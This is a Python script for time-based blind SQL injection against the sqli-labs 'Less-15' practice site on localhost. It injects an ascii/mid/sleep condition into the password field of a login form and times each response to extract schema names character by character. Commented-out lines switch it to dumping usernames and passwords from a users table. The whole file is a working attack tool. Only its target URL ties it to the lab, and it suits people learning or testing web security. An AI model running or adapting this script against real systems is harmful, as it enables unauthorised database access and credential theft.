import sys
import time
import requests


def getPayload(result_index, char_index, ascii):
    # 系统表中数据
    info_database_name = "information_schema"
    info_table_name = "schemata"  # schemata / tables / columns
    info_column_name = "schema_name"  # schema_name / table_name / column_name

    # 注入表中数据
    database_name = "security"
    table_name = "users"
    column_name = ["id", "username", "password"]

    # 连接select
    where_str = ""
    # where_str = " where table_schema='"+database_name+"'"+" and table_name='"+table_name+"'"
    select_str = "select " + info_column_name + " from " + info_database_name + "." + info_table_name + where_str + " limit " + str(
        result_index) + ",1"
    # select_str = "select concat_ws('-',"+column_name[0]+","+column_name[1]+","+column_name[2]+") from "+table_name+" limit "+str(result_index)+",1"

    # 连接payload
    sqli_str = "if(ascii(mid((" + select_str + ")," + str(char_index) + ",1))=" + str(ascii) + ",sleep(0.2),0)"
    payload = {"uname": "1", "passwd": "1' or " + sqli_str + "-- "}
    return payload


def execute(result_index, char_index, ascii):
    # 连接url
    url = "http://localhost:8088/sqlilabs/Less-15/"
    payload = getPayload(result_index, char_index, ascii)
    # print(payload)
    # 检查延时
    before_time = time.time()
    requests.post(url, data=payload)
    after_time = time.time()
    use_time = after_time - before_time
    if use_time > 0.1:
        return True
    else:
        return False


def exhaustive(result_index, char_index):
    # ascii可显字符从32到126共95个 按可能性顺序
    ascii_list = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
                  'u', 'v', 'w', 'x', 'y', 'z', '_', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
                  'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', ' ', '!', '"', '#', '$', '%', '&',
                  '\'', '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':',
                  ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '`', '{', '|', '}', '~']
    for ascii_char in ascii_list:
        ascii = ord(ascii_char)
        if execute(str(result_index), str(char_index + 1), str(ascii)):
            return ascii_char
    return chr(1)


if __name__ == "__main__":
    for num in range(32):  # 查询结果的数量
        count = 0
        for len in range(32):  # 单条查询结果的长度
            count += 1
            char = exhaustive(num, len)
            if ord(char) == 1:  # 单条查询结果已被遍历
                break
            sys.stdout.write(char)
            sys.stdout.flush()
        if count == 1:  # 查询结果已被遍历
            break
        sys.stdout.write("\r\n")
        sys.stdout.flush()
